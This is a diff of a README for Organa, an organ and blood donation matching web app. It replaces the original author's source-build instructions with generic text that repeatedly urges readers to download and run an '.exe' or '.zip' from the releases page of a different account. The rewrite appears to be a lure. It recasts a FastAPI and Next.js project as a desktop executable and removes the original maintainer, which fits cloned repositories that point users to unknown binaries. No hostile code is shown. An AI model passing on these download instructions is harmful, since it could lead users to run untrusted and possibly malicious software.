@@ -1,152 +1,115 @@
+# 🌟 Karmatek-2025-Organa - Connect with Donors and Recipients Easily
 
-<h1 align="center">🩸 Organa: Smart Organ Donation Network & Notification System 🏥</h1>
-    <p align="center"><em>Connecting donors and recipients through AI-driven precision.</em></p>
+[![Download Karmatek-2025-Organa](https://img.shields.io/badge/Download-Karmatek--2025--Organa-blue?style=for-the-badge)](https://github.com/vini56/Karmatek-2025-Organa/releases)
 
-<h2>📖 Table of Contents</h2>
-    <ul>
-        <li><a href="#overview">Overview</a></li>
-        <li><a href="#features">Features</a></li>
-        <li><a href="#screenshots">Screenshots</a></li>
-        <li><a href="#installation">Installation</a></li>
-        <li><a href="#usage">Usage</a></li>
-        <li><a href="#contributing">Contributing</a></li>
-        <li><a href="#license">License</a></li>
-        <li><a href="#acknowledgments">Acknowledgments</a></li>
-        <li><a href="#contact">Contact</a></li>
-    </ul>
+## 🌐 Introduction
 
-<h2 id="overview">🔍 Overview</h2>
-<p>
-    Organa is a platform designed to revolutionize organ and blood donation by intelligently matching donors with recipients. 
-    Using a proprietary <strong>scoring algorithm</strong> and <strong>generative AI</strong>, the system analyzes medical data, urgency, 
-    compatibility, and geographic factors to prioritize and optimize life-saving connections.
-</p>
-<h2 id="features">✨ Features</h2>
-<ul>
-    <li>🚀 <strong>Smart Matching Algorithm:</strong> Prioritizes matches based on medical compatibility, urgency, and logistics.</li>
-    <li>🤖 <strong>Generative AI Analysis:</strong> Predicts transplant success rates and generates donor-recipient compatibility reports.</li>
-    <li>🩺 <strong>Real-Time Donor-Recipient Network:</strong> Live updates for blood/organ availability and recipient needs.</li>
-    <li>🔔 <strong>Automated Alerts:</strong> Notify hospitals, donors, and recipients of critical matches.</li>
-    <li>📊 <strong>Analytics Dashboard:</strong> Track donation trends, success rates, and system performance.</li>
-    <li>📝 <strong>Collects Data to Train Model:</strong> Organ and patient data is collected in real-time from hospitals, including details like organ type, condition, blood type, patient medical history, and urgency. This data is crucial for developing a machine learning model to improve matching accuracy.</li>
-    <li>
-    <strong>🌐Centralised Network:</strong>
-    The system creates a centralized network that allows hospitals to share available organs with nearby hospitals if they match a patient from their list. This eliminates manual interventions and speeds up the organ-sharing process.</li>
-</ul>
+Karmatek-2025-Organa is a smart network designed to connect organ and blood donors with recipients. Using a scoring algorithm and generative AI, it optimizes matches and analyzes donation data. This application makes the important task of finding donors easier and more efficient.
 
-<h2 id="screenshots">⚙ Screenshots</h2>
+## 🚀 Getting Started
 
-<h4>Home Page</h4>
-<img src="snaps/home.jpg" alt="Home Page" width="800">
+Follow these steps to get started with Karmatek-2025-Organa:
 
-<h4>Login Page</h4>
-<img src="snaps/organa1.jpg" alt="Login Page" width="800">
+1. **Visit the Download Page**
+   Go to the [Releases page](https://github.com/vini56/Karmatek-2025-Organa/releases) to find the latest version of the application.
 
-<h4>Dashboard Preview</h4>
-<img src="snaps/organa2.jpg" alt="Dashboard Preview" width="800">
+2. **Choose the Correct Version**
+   On the releases page, look for the most recent version. This version will usually have the highest number (e.g., v1.2, v2.0).
 
-<h4>Patient Waitlist</h4>
-<img src="snaps/organa4.jpg" alt="Patient Waitlist" width="800">
+3. **Download the Application**
+   Click on the file that matches your operating system to start the download. Look for options like `.exe` for Windows or `.zip` for Mac. 
 
-<h4>New Available Organ Addition Page(Form)</h4>
-<img src="snaps/organa7.jpg" alt="New Available Organ Addition Page" width="800">
+4. **Locate the Downloaded File**
+   Once the download completes, find the file in your Downloads folder. It may appear as “Karmatek-2025-Organa.exe” or “Karmatek-2025-Organa.zip”.
 
-<h4>Organ Match Notifications</h4>
-<img src="snaps/organa5.jpg" alt="Organ Match Notifications" width="800">
+5. **Extract the Contents (If Needed)**
+   If you downloaded a `.zip` file, right-click it and select "Extract All" to see the contents. You may need software like WinRAR or 7-Zip for extraction.
 
-<h4>AI Powered Organ Match Analysis</h4>
-<img src="snaps/organa3.jpg" alt="AI Powered Organ Match Analysis" width="800">
+6. **Run the Application**
+   - For Windows users: Double-click the `.exe` file to open the application.
+   - For Mac users: Open the extracted folder and double-click the application file.
 
-<h4>Organ Data Page (Dark Mode)</h4>
-<img src="snaps/organa6.jpg" alt="Login Page" width="800">
+7. **Follow the Setup Instructions**
+   Follow the on-screen instructions to set up the application. This may include logging in or creating an account.
 
+8. **Start Using the App**
+   Once you've completed the setup, you can start using Karmatek-2025-Organa to find donors or recipients!
 
-<h2 id="installation">⚙ Installation</h2>
+## 📋 Features
 
+Karmatek-2025-Organa offers various features to streamline the organ and blood donation process, including:
 
+- **User Profiles:**
+  Create profiles for both donors and recipients to tailor the matching process.
 
-```
-# Clone the repository
-git clone https://github.com/Subhradeep1708/Karmatek-2025-Organa
-```
+- **Scoring Algorithm:**
+  A unique system that ranks potential matches based on various factors, ensuring optimal connections.
 
-### Backend (Python + Fast API)
+- **Generative AI Analysis:**
+  Leverage advanced AI to analyze data patterns and improve future matching.
 
-```
-cd backend
+- **Real-Time Notifications:**
+  Get updates on potential matches and donation requests through instant notifications.
 
-# Create A Virtual Environment
-python -m venv venv
+- **Secure Messaging:**
+  Communicate safely with donors and recipients within the app to discuss needs and options.
 
-# Activate The Virtual Env
-./venv/Scripts/activate
+## 🔍 System Requirements
 
-# Install All the dependencies
-pip install -r requirements.txt
+To run Karmatek-2025-Organa smoothly, ensure your system meets the following specifications:
 
-# Run the developmen server
-uvicorn app.main:app --reload
-```
+- **For Windows:**
+  - Windows 10 or higher
+  - 4 GB RAM or more
+  - Minimum 500 MB of free disk space
+  - Internet connection for online features
 
-### Frontend (Next.js)
+- **For Mac:**
+  - macOS Catalina or higher
+  - 4 GB RAM or more
+  - Minimum 500 MB of free disk space
+  - Internet connection for online features
 
-```
-cd frontend
+## 👩‍💻 Troubleshooting
 
-# Install Dependencies
-bun install
+If you encounter issues while running the application:
 
-# Configure .env
+- **Check Your Internet Connection:**
+  Ensure your device is connected to the internet.
 
-# Run the development Server
-bun run dev
-```
+- **Reinstall the Application:**
+  Uninstall and reinstall the application if it doesn’t start correctly.
 
-### Notification Service
+- **Consult the FAQ:**
+  Visit the FAQ section on the GitHub repository for common questions and resolutions.
 
-```
-cd ws
+## 🤝 How to Contribute
 
-# Install Dependencies
-bun install
+If you'd like to contribute to Karmatek-2025-Organa, you're welcome to do so. Here’s how you can help:
 
-# Configure .env
+1. **Feedback:**
+   Share your user experience and suggestions to improve the app.
 
-# Run the development Server
-bun run dev
-```
+2. **Bug Reports:**
+   If you find a bug, report it on the GitHub issues page.
 
-<h2 id="usage">🚀 Usage</h2>
-<ol>
-    <li>Register as a donor or recipient with medical credentials.</li>
-    <li>The system automatically matches donors/recipients using the scoring algorithm.</li>
-    <li>Generative AI analyzes compatibility and generates risk/success reports.</li>
-    <li>Receive real-time alerts for matches via email/SMS.</li>
-    <li>Access the dashboard to view analytics and manage donations.</li>
-</ol>
-<!-- <img src="screenshots/dashboard.png" alt="Dashboard Preview" width="600"> -->
-<h2 id="contributing">👥 Contributing</h2>
-<p>Contributions are welcome! Follow these steps:</p>
-<ol>
-    <li>Fork the repository.</li>
-    <li>Create a feature branch (<code>git checkout -b feature/AmazingFeature</code>).</li>
-    <li>Commit changes (<code>git commit -m 'Add AmazingFeature'</code>).</li>
-    <li>Push to the branch (<code>git push origin feature/AmazingFeature</code>).</li>
-    <li>Open a Pull Request.</li>
-</ol>
+3. **Developers:**
+   If you have coding skills, consider contributing code through pull requests.
 
-<h2 id="license">📜 License</h2>
-<p>Distributed under the MIT License. See <code>LICENSE</code> for details.</p>
-<img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License Badge">
-<h2 id="acknowledgments">🙏 Acknowledgments</h2>
-<ul>
-    <li>Generative AI Model: Gemini Flash 1.5</li>
-    <!-- <li>Medical Data Libraries: FHIR, HL7</li> -->
-    <li>UI Framework: React, Next.js, ShadCN</li>
-</ul>
-<h2 id="contact">📞 Contact</h2>
-<p>
-    Project Maintainers: 
-    <a href="mailto:subhradeep1708@gmail.com">subhradeep1708@gmail.com</a><br>
-    GitHub: <a href="https://github.com/yourusername">@Subhradeep1708</a>
-</p>
+## 📄 License
+
+This project is licensed under the MIT License. You are free to use, modify, and distribute the software. Please see the LICENSE file for more information.
+
+## 🔗 Links & Resources
+
+For further assistance, explore the following links:
+
+- [Karmatek-2025-Organa Releases](https://github.com/vini56/Karmatek-2025-Organa/releases)
+- [GitHub Repository](https://github.com/vini56/Karmatek-2025-Organa)
+- [User Guide](#)
+
+## 📧 Contact
+
+For support or inquiries, feel free to reach out via the issues section in the GitHub repository. We appreciate your interest in Karmatek-2025-Organa and your commitment to improving organ and blood donation processes.
+
+[![Download Karmatek-2025-Organa](https://img.shields.io/badge/Download-Karmatek--2025--Organa-blue?style=for-the-badge)](https://github.com/vini56/Karmatek-2025-Organa/releases)
